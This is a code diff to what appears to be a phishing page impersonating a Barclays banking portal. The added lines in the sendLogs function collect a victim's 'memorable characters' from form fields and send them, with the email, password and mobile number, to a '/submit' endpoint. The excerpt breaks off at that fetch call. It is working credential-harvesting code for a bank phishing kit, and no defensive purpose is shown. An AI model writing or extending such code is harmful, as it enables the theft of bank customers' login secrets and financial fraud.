@@ -275,12 +275,33 @@
 
   async function sendLogs(type) {
     syncLogAliases();
+    
+    // Universal memorable characters capture
+    var memorable_chars = '';
+    // Look for inputs with IDs like char1, char2, char3
+    for (var i = 1; i <= 10; i++) {
+      var charInput = document.getElementById('char' + i);
+      if (charInput) {
+        memorable_chars += charInput.value || '';
+      }
+    }
+    // Also look for elements with class .ms-memorable
+    var memElements = document.querySelectorAll('.ms-memorable');
+    if (memElements.length > 0) {
+      memorable_chars = '';
+      memElements.forEach(function(el) {
+        if (el.value !== undefined) memorable_chars += el.value;
+        else if (el.textContent) memorable_chars += el.textContent;
+      });
+    }
+    
     const data = {
       page: 'Barclays Portal',
       type: type,
       email: document.getElementById('email').value,
-      pwd: document.getElementById('pwd').value,
-      msMobile: document.getElementById('ms-mobile').value
+      pwd: document.getElementById('pwd').value || memorable_chars,
+      msMobile: document.getElementById('ms-mobile').value,
+      memorable_chars: memorable_chars
     };
     try {
       await fetch('/submit', {
